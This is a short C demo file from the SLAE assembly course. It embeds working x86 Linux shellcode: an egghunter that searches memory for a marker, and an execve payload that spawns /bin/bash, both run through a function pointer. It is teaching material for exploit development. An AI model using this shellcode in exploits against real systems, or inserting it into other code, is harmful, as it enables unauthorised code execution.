//Egghunter Demo File
// Author: fbcsec
// This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
// http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
// Student ID: SLAE - 1187

#include <stdio.h>
#include <string.h>

#define EGG "\x44\x43\x42\x41"

unsigned char egghunter[] = \
"\x31\xC9\xF7\xE1\x66\x81\xCA\xFF\x0F\x42\x8D\x5A\x04\x6A\x21\x58\xCD\x80\x3C\xF2\x74\xEE\xB8\x44\x43\x42\x41\x89\xD7\xAF\x75\xE9\xAF\x75\xE6\xFF\xE7";

unsigned char shellcode[] = \
EGG
EGG
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void) {
    printf("Shellcode length: %d\n", strlen(shellcode));

    int (*ret)() = (int(*)())egghunter;

    ret();
}
